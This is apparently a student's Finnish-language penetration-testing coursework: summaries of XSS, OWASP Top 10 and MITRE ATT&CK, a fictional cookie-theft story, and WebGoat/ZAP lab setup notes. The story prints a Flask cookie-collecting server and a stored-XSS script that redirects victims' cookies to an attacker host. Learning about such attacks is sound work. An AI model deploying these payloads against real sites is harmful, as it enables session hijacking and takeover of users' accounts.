[<-- Takaisin etusivulle](index.md)

# h3: Attaaack!
Kurssisivu ja tehtävät: [https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h3-attaaack](https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h3-attaaack)

## Sisällysluettelo 

* TOC
{:toc}

## x) Lue/katso/kuuntele ja tiivistä
*Tässä alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen ja tiivistelmä riittää). Tiivistä ranskalaisilla viivoilla.*

### € Percival & Samancioglu 2020: The Complete Ethical Hacking Course: Chapter 21: Cross Site Scripting
*[Chapter 21: Cross Site Scripting](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/) (7 videota, noin 25 min)*
 - XSS tarkoittaa Cross-Site Scriptingiä. 
 - XSS ei tarvitse erillistä ohjelmaa.
 - Syöttää injektion palvelimelle joka ajetaan käyttäjäpäässä, uhrin selaimessa. 
 - Syöttökentässä voidaan lähettää skripti URL:ssa. 
    - Tarkoittaa että syöttökentässä käytetään GET methodia. 
    - Tämä häkätty URL voidaan sitten lähettää kenelle tahansa joka linkkiä klikatessaan ajaa URL:ssa olevan skriptin. 
 - Voidaan myös tallettaa skripti sivulle POST methodilla syöttökentän kautta jos sivu tallettaa tietoja. 
    - Kuka tahansa sivulle tulija automaattisesti ajaa skriptin.
    - Elementin maxlength voi muokkaa dev toolseilla ja syöttää pidempiä skriptejä kuin lähdekoodi sallisi. 
 - Yhdistettynä muihin työkaluihin kuten BeEF ([https://beefproject.com/](https://beefproject.com/)) voi kerätä haavottuneita koneita talteen jatkohyökkäystä varten. 
 - Suojautumiseksi selaimen asetuksissa voi kytkeä yksittäisten sivujen JavaScriptin pois päältä. (Joku vertasi joskus verkkosivuja autoon ja JavaScriptiä rattiin, eli mistään universaalista hyvästä ratkaisusta ei ole kyse.) 

### OWASP 10 2017 [PDF](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf)
*A2 Broken Authentication, A3 Sensitive Data Exposure, A7 Cross Site Scripting.
Poimi kustakin kolmesta hyökkäyksestä, miten ne käytännössä tehdään*

#### A2 Broken Authentication
Hyökkääjillä hallussa miljoonia käyttäjätunnuksia ja salasanayhdistelmiä ([https://owasp.org/www-community/attacks/Credential_stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)), default ylläpitotililistoja, automatisoituja brute force- ja sanakirjahyökkäyksiä. Istunnonhallintahyökkäykset ja vanhentumattomat istuntotokenit hyökkääjillä hyvin tiedossa. 

Hyökkäystapoja: 
  - Credential stuffing
    - Listoja tunnettuja salasanoja yhdessä käyttäjätunnuksen kanssa syötetään palveluun
  - Salasanojen käyttö ainoana tunnistustapana. Salasanojen kierrättäminen ongelma. 
  - Istunnon aikakatkaisu ei ole säädetty oikein. Uhri käyttää julkista konetta, kirjautuu palveluun ja sulkee selaimen uloskirjautuisen sijasta. Hyökkääjä käyttää myöhemmin samaa konetta ja istuntotokenia. 

#### A3 Sensitive Data Exposure
Hyökkääjät varastavat avaimia tai selkotekstistä dataa, tekevät man-in-the-middle hyökkäyksiä. Aiemmin saadut salasanatietokannat voidaan brute forcettaa näytönohjaimilla. 

Hyökkäystapoja:
 - Applikaatio kryptaa luottokortin numerot kannassa, mutta automaattisesti purkaa kryptauksen niitä haettaessa. SQL-injektio hakee selkotekstiset luottokorttitiedot.
 - Sivu ei varmista TLS:n käyttöä tai käyttää heikkoa kryptausta. Hyökkääjä tarkkailee verkkoliikennettä suojaamattomassa WLAN verkossa ja heikentää yhteydet https:stä http:hen. Hyökkääjä sieppaa verkkopyynnön ja käyttäjän istuntokeksin. Hyökkääjä käyttää keksiä varmennetun istunnon kaappaamiseen ja pääsee käyttäjän dataan. 
 - Salasanatietokanta käyttää yksinkertaisia tai suolaamattomia ([https://en.wikipedia.org/wiki/Salt_(cryptography)](https://en.wikipedia.org/wiki/Salt_(cryptography))) tiivisteitä. Latausvirhe mahdollistaa hyökkääjän ladata kannan. Suolaamattomat tiivisteet voidaan murtaa etukäteen lasketuilla tiivisteillä, [rainbow tableilla](https://en.wikipedia.org/wiki/Rainbow_table). Yksinkertaisilla tai nopeilla tiivistefunktioilla muodostetut tiivisteet voidaan murtaa näytönohjaimilla vaikka ne olisi suolattu. 

#### A7 Cross Site Scripting
Sisältää kolme tapaa jotka kohdistuvat yleensä uhrin selaimeen: 
 - Reflected XSS
  - Validoimaton vihamielinen käyttäjäsyöteskripti syötetään osaksi sivun HTML:ää. 
  - Liittyy, lisälukemista: watering hole attack: [https://en.wikipedia.org/wiki/Watering_hole_attack](https://en.wikipedia.org/wiki/Watering_hole_attack)
 - Stored XSS
  - Validoimaton vihamielinen käyttäjäsyöteskripti tallentuu ohjelmistoon tai API:in.
 - DOM XSS
  - Dynaamisesti lisätty vihamielinen skripti. 

Hyökkäys tehdään yleensä validoimattoman ja sanitarisoimattoman käyttäjäsyötteen kautta. Hyökkääjä syöttää syöttökentän kautta hyökkäyksen kohdeohjelmistoon skriptin, jonka uhri suorittaa selaimessaan ollessaan yhteydessä häkättyyn kohdeohjelmistoon. 

### MITRE 2021: [ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/) - Tactic, Technique, Procedure
*Selitä tiivistelmässä käsitteet tactic, technique, procedure. Selitä kukin taktiikka (tactic) ja anna kustakin taktiikasta esimerkkitekniikka (technique tai subtechnique)*

Kuten lounastauolla tuli jo tutuksi, taktiikat ovat yläkäsite, se mitä hyökääjä tavoittelee, tekniikat kuinka hyökkääjä sen tekee ja proseduurit todellisia tapahtumia missä tekniikkaa on käytetty. 

  - Taktiikat vastaavat kysymykseen "miksi". Se on hyökkääjän tavoittelema taktinen tavoite kuten autentikoitu sisäänpääsy järjestelmään. 
  - Tekniikat vastaavat kysymykseen "kuinka". Se kuvailee kuinka hyökkääjä saavuttaa taktisen tavoitteensa. 
  - Proseduurit ovat spesifejä toteutuksia tietystä tekniikasta tai alatekniikasta. Proseduurit on kategorisoitu niiden todellisten käyttötilanteiden pohjalta proseduuriesimerkit -kohtaan tekniikoissa. 

#### Taktiikka: Tiedustelu (Reconnaissance)
Tiedusteluvaiheessa hyökkääjä kerää tietoa jatko-operaatioiden suunnittelemiseksi. 

#### Taktiikka: Resurssien kokoaminen (Resource Development)
Resurssien kokoamisen aikana hyökkääjä kerää, kehittää, ostaa, varastaa, tms. muin keinoin haalii resursseja operaatioidensa tueksi. 

#### Taktiikka: Sisäänpääsy (Initial Access)
Hyökkääjä pyrkii sisään kohdeverkkoon. 

#### Taktiikka: Suorittaminen (Execution)
Hyökkääjä pyrkii ajamaan vihamielistä koodia kohteen lokaaleissa tai etäjärjestelmissä. 

#### Taktiikka: Pysyminen (Persistence)
Hyökkääjä pyrkii pitämään jalansijansa kohdejärjestelmissä salasanavaihdoista, uudelleenkäynnistyksistä jne. huolimatta.

#### Taktiikka: Käyttöoikeuksien kasvattaminen (Privilege Escalation)
Hyökkääjä pyrkii kasvattamaan käyttöoikeuksiaan suuremman keinovalikoiman mahdollistamiseksi. 

#### Taktiikka: Piiloutuminen (Defense Evasion)
Hyökkääjä pyrkii piileskelemään kohdeverkossa tai -järjestelmissä. 

#### Taktiikka: Tunnistetietojen käyttö (Credential Access)
Hyökkääjä pyrkii varastamaan salasanoja ja käyttäjänimiä. 

#### Taktiikka: Kartoittaminen (Discovery)
Hyökkääjä pyrkii hahmottamaan kohdeympäristöä suunnitellakseen jatko-operaatioita. 

#### Taktiikka: Ympäristössä liikkuminen (Lateral Movement)
Hyökkääjä liikkuu ympäristössä saavuttaakseen tavoitteensa tai etua jatko-operaatioihin. 

#### Taktiikka: Datan kerääminen (Collection)
Hyökkääjä kerää dataa tavoitteensa saavuttamiseksi. 

#### Taktiikka: Hallinta (Command and Control)
Hyökkääjä kommunikoi vaarantuneiden järjestelmien kanssa saavuttaakseen niiden hallinnan. 

#### Taktiikka: Datan varastaminen (Exfiltration)
Hyökkääjä pyrkii kotiuttamaan keräämänsä datan kohdejärjestelmästä. 

#### Taktiikka: Vaikuttaminen (Impact)
Hyökkääjä pyrkii manipuloimaan, häiritsemään tai tuhoamaan kohdejärjestelmiä tai kohdedataa.

## z) Cross Site Story
*Kirjoita kuvitteellinen esimerkki XSS-hyökkäyksestä. Tee mahdollisimman yksinkertainen esimerkki. Voit vaikkapa ottaa haltuun weppisivun ylläpitäjän oikeudet viemällä keksin. Tässä alakohdassa ei tarvitse tehdä mitään tietokoneella, pelkkä tarina riittää. Tarkoituksena on ymmärtää XSS-hyökkäyksen kokonaisuus ennen sormiharjoituksia. Voi halutessasi myös piirtää itse kaavion / sarjakuvan.*

### Tarinan tausta
Traaginen postmoderni tarina Cross Site Story sijoittuu kaikille tuttuun miljööseen, Internettiin. Tarina on monelle tuttu, sillä se on [OWASP TOP 10:ssä](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf) 2017 sijalla seitsemän ja vuonna 2019 tehdyn [tutkimuksen](https://digitalcommons.odu.edu/cgi/viewcontent.cgi?article=1459&context=vjs) mukaan yli 60% verkkosivuista oli XSS-hyökkäykselle alttiita.

Tarinassa on käytetty lähtökohtana tehtävänannon esimerkkiä verkkosivun ylläpitäjän keksin varastamisesta ja [Laur Telliskiven blogipostausta aiheesta](https://medium.com/@laur.telliskivi/pentesting-basics-cookie-grabber-xss-8b672e4738b2). Keksivaras kertoo palvelimelle tallennetusta, stored XSS-hyökkäyksen tyypistä (muita olivat DOM eli verkkosivulle dynaamisesti lisätty vihamielinen skripti ja reflected eli käyttäjän selaimessa tapahtuva XSS). Yksinkertaisempi heijasteinen (reflected) XSS-hyökkäys esimerkki voidaan kuvata näin [aiemman tehtävän perusteella](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_5/): 

  - Verkkosivu kysyy käyttäjän nimeä syöttökentässä. 
  - Verkkosivu lähettää käyttäjälle tervehdyksen nimen perusteella url:n parametrina http://sivu-url?name=nihti, selaimessa näkyy "Hello nihti". 
  - Hyökkääjä syöttää XSS-hyökkäykselle alttiiseen verkkosivun syöttökenttään js-skriptin: 
  
```html
<script>alert("I hack you")</script>
```

  - Hyökkääjä kopioi syntyneen url:n: `http://sivu-url?name=<script>alert("I+hack+you")<%2Fscript>#` ja lähettää sen pahaa-aavistamattomalle uhrille. Jos sivusto http://sivu-url on julkisessa verkossa kuka tahansa linkkiä seuraava altistuu skriptille. 
  - Hyökkääjä voisi vielä naamioida linkin tekstin houkuttelevammaksi esimerkiksi sähköpostissa, tähän tapaan:
 
[Klikkaamaan houkutteleva linkkiteksti](ihackyou.md)

Ja tämä näytelmä pyörisi kaikissa linkkiä klikanneissa selaimissa. 

### Esityksen entiteetit
Näytelmässä ei ole kivoja rooleja jaossa, vaan tämä on varoittava esimerkkitarina. 

  - **Keksivaras/hyökkääjä** 
  - **Keksivarasto/hyökkääjän palvelin**
  - **Käyttäjä/uhri/selain** 
  - **XSS-hyökkäykselle altis verkkosivu/palvelin** 

### Keksivaras
*Tee selväksi ja erottele
  *- Mitä hyökkääjä tekee
  *- Mitä kohdehenkilö tekee
  *- Mitä sivua / palvelinta kohdehenkilö surffailee
  *- Missä JavaScriptit ajetaan
  *- Miten keksi päätyy hyökkääjälle
  *- Miten hyökkääjä hyödyntää keksiä?
  *- Mitä hyökkääjä pääsee tekemään (mikä ei onnistuisi ilman hyökkäystä)?*
  
Istunto- ja autentikointikeksit sisältävät tietoa käyttäjän sivukäynnistä (kuinka, milloin?) ja käyttäjästä itsestään (käyttäjänimi, salasana). Keksivarkaan ensimmäinen tehtävä on pystyttää oma varastettujen keksien varastona toimiva verkkopalvelin http://keksivarasto.com. Keksivaras käyttää Pythonin verkkopalvelin framework [Flaskia](https://flask.palletsprojects.com/en/2.0.x/).

  - Hyökkääjä löytää verkosta XSS-hyökkäykselle haavoittuvan verkkosivun osoitteessa http://haavoittuvasivu.fi/
  - Hyökkääjä perustaa keksivarastona toimivan palvelimen. 
  - Hyökkääjä kirjoittaa oman funktion keksien sieppaamiseksi:

```python
# ... enemmän koodia

def keksi():

    # Siepataan keksi ja kirjataan se keksit.txt tiedostoon
    
    keksi = request.args.get('c')
    f = open("keksit.txt","a")
    f.write(keksi + ' ' + str(datetime.now()) + '\n')
    f.close
    
    # Ohjaa uhri takaisin haavoittuvalle sivulle    
    
    return redirect("http://haavoittuvasivu.fi/")
    
# ... lisää koodia
  app.run(host = '0.0.0.0', port=5000) # 0.0.0.0 kuuntelee kaikkia julkisia IP:tä
```

  - Hyökkääjä injektoi JavaScript-koodin XSS-hyökkäykselle alttiille haavoittuvasivu.fi:lle sivuston kommenttikentän syöttökentän kautta:

```javascript
<script type=“text/javascript”>document.location=“http://keksivarasto.com:5000/?c=“+document.keksi;</script>
```

  - Skripti tallentuu XSS-hyökkäykselle haavoittuvan sivun haavoittuvasivu.fi kommenttiosion lähdekoodiin. 
  - Injektoitu skripti ohjaa haavoittuvasivu.fi:n kommenttiosiolle tulevan käyttäjän keksivarasto.com sivulle ja sieppaa käyttäjän keksin document.keksi funktiolla.
  - Käyttäjä kirjautuu haavoittuvasivu.fi:lle ja surffaa kommenttiosioon jolloin keksivaraston keksit.txt tiedostoon tallentuu uusi keksi. 
  - Keksivaras kirjautuu varastettua keksiä keksit.txt tiedostosta käyttäen haavoittuvasivu.fi:lle. 
  - Koska käyttäjä oli sivuston pääkäyttäjä, nyt keksivarkaalla on sivuston ylläpitäjän kaikki oikeudet. Hänellä on kaikki oikeudet lisätä, poistaa tai muokata sivustoa mielensä mukaan.

## Tee ja raportoi

### a) Vuohen uudet seikkailut
*Ratkaise WebGoatista tehtävät*

#### Alkutoimet
Joudun aloittamaan tehtävän uudella [WebGoatin](https://owasp.org/www-project-webgoat/) asennuksella koska lapsi meni pesuveden mukana kun poistin turhia koneita VB:stä viime kerran jälkeen. Aloitan importtaamalla Kali Linux VB:hen ja seuraamalla jälleen opettajan ohjeita: [https://terokarvinen.com/2020/install-webgoat-web-pentest-practice-target/](https://terokarvinen.com/2020/install-webgoat-web-pentest-practice-target/). 

Vaihdetaan ensin kuitenkin näppäimistö Keyboard -> Layout -> Edit -> eng -> fi ja salasana:
`passwd`
`sudo passwd` 

Sitten ajetaan update ja vaihdetaan rootiksi:
`sudo apt-get update`
`sudo -i` 

Asennetaan Java ja [UFW](https://www.linux.fi/wiki/UFW) palomuuri 
`apt-get -y install openjdk-11-jre ufw`

Laitetaan palomuuri päälle ja kielletään kaikki sisääntuleva liikenne
`ufw enable`
`ufw default deny incoming` 

Asennetaan WebGoat jälleen Kalina
`exit`
Ladataan WG
`wget https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M26/webgoat-server-8.0.0.M26.jar`
Asennetaan WG
`java -jar webgoat-server-8.0.0.M26.jar` 

Vika komento myös käynnistää WG:n, mennään selaimessa http://localhost:8080/WebGoat/ ja rekisteröidään uusi vuohi. 

##### Proxy - ZAP

Tehtävässä tarvitaan todennäköisesti [välityspalvelinta eli proxyä](https://fi.wikipedia.org/wiki/V%C3%A4lityspalvelin). Ensimmäisellä kerralla asensimme sen onnistuneesti WG:n omia ohjeita seuraamalla. Katsotaan millaista muuta ohjetta olisi tarjolla, sillä porttiasetukset jäivät viime kerralla hieman hämäriksi. Eli toisin kuin ekalla asennuksella kuvittelin, proxyn tulee nimenomaan olla omassa portissaan eikä pyöriä samassa portissa muiden ohjelmistojen kanssa - kuinka se olisi edes mahdollista? n00bin ajatuspieru ja l33tin facepalm tähän. 

Aloitetaan orientoivalla videoilla: [https://www.youtube.com/watch?v=ICPqz1Al9fk](https://www.youtube.com/watch?v=ICPqz1Al9fk) ja [https://www.youtube.com/watch?v=TyhaA3DJ5oM](https://www.youtube.com/watch?v=TyhaA3DJ5oM)

**Firefox**in (Kalin oletusselain) proxy säädetään Preferences --> Proxy --> Settings --> Manual proxy. HTTP Proxy: localhost (edit: muutettu ip-muotoon: 127.0.0.1), Port: 8090. Raksitaan myös https/ftp yhteyksille WG:n ohjeiden mukaan. Lisäksi Firefoxin uudet versiot ( >=v.67 ) vaatii asetuksen `network.proxy.allow_hijacking_localhost = true`, sinne pääsee selaimessa `about:config` sivulta. 

Koska proxyn manuaalinen päälle pistäminen ja poistaminen vaikutti työläältä viime kerralla asennetaan [FoxyProxy](https://addons.mozilla.org/fi/firefox/addon/foxyproxy-standard/) selainlaajennus. Asennusta varten otin proxyn pois päältä. Myös **FoxyProxy** vaatii proxy-asetusten säätämisen: Add --> Proxy Type: "HTTP", Proxy IP address or DNS name: "127.0.0.1", Port: "8090" ja Save. 

FoxyProxyn käyttö vaatii Firefox preferences --> Proxy --> Settings --> Manual proxyn vaihtamisen --> No proxy. Nyt FF asetusten sijasta selainlaajennus huolehtii proxyn päälle ja pois. 

**ZAP**:ssa Tools --> Options --> Local Proxies. Localhost 8090. 

Suodatetaan WebGoatin taustaliikenne pois ohjeiden mukaan: URL Inc Regex: `http://localhost:8080/WebGoat/.*`
Eli näytä ZAP:ssa kaikki localhostissa portissa 8080 /WebGoat/ polussa tapahtuva liikenne
ja suodata pois URL Exc Regex: `.*/WebGoat/service/.*mvc` eli kaikki WebGoat/service liikenne missä tiedostopääte mvc. 

Suodatus käyttää [regexiä](https://fi.wikipedia.org/wiki/S%C3%A4%C3%A4nn%C3%B6llinen_lauseke) eli regular expressionsia joka on oma taiteenlajinsa jota ilman ei voi paljoa hakkerointia harrastaa. Aihe on entuudesta tuttu ja sitä on tullut tavattua jo vähän muttei tarpeeksi. 

Viimein välityspalvelimen asetukset ovat valmiit! Sitten on opeteltava käyttämään OWASP ZAP:ia. WebGoat antaa vihjeitä kuinka tehtävä tulee ratkaista, mutta että ZAP:ssa saa valittua oikeat näkymät sen tekemiseksi?

#### A2 Broken authentication:
##### Authentication bypasses: 2 2FA Password Reset

#### A3 Sensitive data exposure
##### Insecure Login: 2 Let's try

#### A7 Cross Site Scripting (XSS): Cross site scripting
##### 2 What is XSS?
##### 7 Try It! Reflected XSS

#### A8:2013 Request Forgeries:
Cross-Site Request Forgeries
##### 3 "Basic Get CSRF Exercise"
##### 4 "Post a review on someone else’s behalf".*

### b) Attakin alatekniikat
*Demonstroi kaksi (2) alatekniikkaa (subtechnique) ATT&CK kehikosta. Tässä pitää siis käyttää näitä käytännössä johonkin harjoitusmaaliin. Voit käyttää haluamiasi valmiita työkaluja tai koodata / skriptata itse. Voit valita valmiin harjoitusmaalin tai tehdä sen itse. __Muista, että myös tiedustelussa pitää noudattaa lakia, etiikkaa, rajauksia (scope) ja hyviä tapoja.__*

